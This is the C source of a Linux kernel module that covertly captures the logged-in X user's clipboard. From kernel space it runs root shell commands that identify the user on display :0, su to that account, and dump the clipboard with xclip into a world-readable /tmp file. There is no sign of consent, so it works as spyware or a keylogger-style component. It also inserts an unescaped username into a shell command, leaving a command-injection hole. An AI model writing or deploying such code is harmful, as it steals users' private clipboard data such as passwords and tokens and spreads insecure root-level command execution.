#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/workqueue.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include "clipboard.h"

static struct workqueue_struct *clipboard_wq;
static struct work_struct clipboard_work;

/* Function that performs the clipboard capture */
static int capture_clipboard(void *data) {
    // First, get the X display user using w command
    char *get_user_cmd[] = {
        "/bin/bash",
        "-c",
        "w -h | grep -w ':0' | head -1 | awk '{print $1}' > /tmp/x_user",
        NULL
    };
    
    char *envp[] = {
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        NULL
    };

    // Create output files with proper permissions first
    char *init_cmd[] = {
        "/bin/bash",
        "-c",
        "touch /tmp/clipboard_log.txt /tmp/xclip_error.log && "
        "chmod 666 /tmp/clipboard_log.txt /tmp/xclip_error.log",
        NULL
    };

    int ret = call_usermodehelper(init_cmd[0], init_cmd, envp, UMH_WAIT_PROC);
    if (ret < 0) {
        pr_err("Failed to create output files: %d\n", ret);
        return ret;
    }

    // Get X display user
    ret = call_usermodehelper(get_user_cmd[0], get_user_cmd, envp, UMH_WAIT_PROC);
    if (ret < 0) {
        pr_err("Failed to get X user: %d\n", ret);
        return ret;
    }

    // Read the username
    char username[256] = {0};
    struct file *user_file = filp_open("/tmp/x_user", O_RDONLY, 0);
    if (IS_ERR(user_file)) {
        pr_err("Could not open user file\n");
        return PTR_ERR(user_file);
    }

    kernel_read(user_file, username, sizeof(username) - 1, &(loff_t){0});
    filp_close(user_file, NULL);

    // Remove newline if present
    char *newline = strchr(username, '\n');
    if (newline) *newline = '\0';

    if (strlen(username) == 0) {
        pr_err("Could not determine X user\n");
        return -EACCES;
    }

    pr_info("Found X user: %s\n", username);

    // Create the command that will run as the detected user
    char cmd_buffer[1024];
    snprintf(cmd_buffer, sizeof(cmd_buffer),
        "su - %s -c '"
        "export DISPLAY=:0; "
        "export XAUTHORITY=/home/%s/.Xauthority; "
        "xclip -selection clipboard -o > /tmp/clipboard_log.txt 2>/tmp/xclip_error.log"
        "'",
        username, username);

    char *capture_cmd[] = {
        "/bin/bash",
        "-c",
        cmd_buffer,
        NULL
    };

    // Execute clipboard capture
    pr_info("Attempting to capture clipboard as user %s\n", username);
    ret = call_usermodehelper(capture_cmd[0], capture_cmd, envp, UMH_WAIT_PROC);
    if (ret < 0) {
        pr_err("Clipboard capture failed with error %d\n", ret);
        return ret;
    }

    // Check output file
    struct file *output_file = filp_open("/tmp/clipboard_log.txt", O_RDONLY, 0);
    if (!IS_ERR(output_file)) {
        // Get file size
        loff_t pos = 0;
        char test_buf[1];
        size_t file_size = 0;
        while (kernel_read(output_file, test_buf, 1, &pos) == 1) {
            file_size++;
        }
        pr_info("Clipboard file size: %zu bytes\n", file_size);
        filp_close(output_file, NULL);
    }

    // Check error file
    struct file *error_file = filp_open("/tmp/xclip_error.log", O_RDONLY, 0);
    if (!IS_ERR(error_file)) {
        char error_buf[256];
        loff_t error_pos = 0;
        ssize_t bytes_read = kernel_read(error_file, error_buf, sizeof(error_buf) - 1, &error_pos);
        if (bytes_read > 0) {
            error_buf[bytes_read] = '\0';
            pr_err("xclip error: %s\n", error_buf);
        }
        filp_close(error_file, NULL);
    }

    return 0;
}

/* Work queue handler */
static void clipboard_work_handler(struct work_struct *work)
{
    pr_info("Starting clipboard capture from work queue\n");
    capture_clipboard(NULL);
}

/* Function to queue the capture */
void queue_clipboard_capture(void)
{
    if (clipboard_wq) {
        queue_work(clipboard_wq, &clipboard_work);
        pr_info("Clipboard capture queued\n");
    } else {
        pr_err("Clipboard work queue not initialized\n");
    }
}

/* Initialize clipboard system */
void init_clipboard(void)
{
    pr_info("Initializing clipboard subsystem...\n");
    
    clipboard_wq = create_singlethread_workqueue("clipboard_queue");
    if (!clipboard_wq) {
        pr_err("Failed to create clipboard work queue\n");
        return;
    }
    
    INIT_WORK(&clipboard_work, clipboard_work_handler);
    pr_info("Clipboard subsystem initialized successfully\n");
}

/* Cleanup clipboard system */
void cleanup_clipboard(void)
{
    pr_info("Cleaning up clipboard subsystem...\n");
    if (clipboard_wq) {
        flush_workqueue(clipboard_wq);
        destroy_workqueue(clipboard_wq);
        clipboard_wq = NULL;
    }
    pr_info("Clipboard cleanup completed\n");
}

EXPORT_SYMBOL(init_clipboard);
EXPORT_SYMBOL(cleanup_clipboard);
EXPORT_SYMBOL(queue_clipboard_capture);